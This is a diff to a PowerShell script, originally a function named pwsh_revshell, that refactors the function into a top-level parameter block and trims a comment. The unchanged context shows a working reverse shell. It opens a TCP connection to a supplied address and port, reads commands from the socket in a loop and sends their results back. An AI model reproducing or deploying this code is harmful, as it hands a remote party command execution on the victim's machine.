@@ -1,5 +1,4 @@
-Function pwsh_revshell {
-  Param (
+Param (
     [Parameter(Mandatory=$true)]
     [ValidateNotNullOrEmpty()]
     [string]
@@ -16,7 +15,7 @@ $Socket = New-Object System.Net.Sockets.TCPClient($Address, $port)
 $stream = $Socket.GetStream() 
 $Writer = New-Object System.IO.StreamWriter($stream)
 
-$bytes = New-Object System.Byte[] 16384 #Supports commands up to 16384 bytes. If you need more space, increase this number
+$bytes = New-Object System.Byte[] 16384 # Commands up to 16384 bytes
 
 while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
   $EncodedText = New-Object System.Text.ASCIIEncoding
@@ -35,4 +34,3 @@ while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
 }  
 $Stream.Close()
 $Socket.Close()
-}
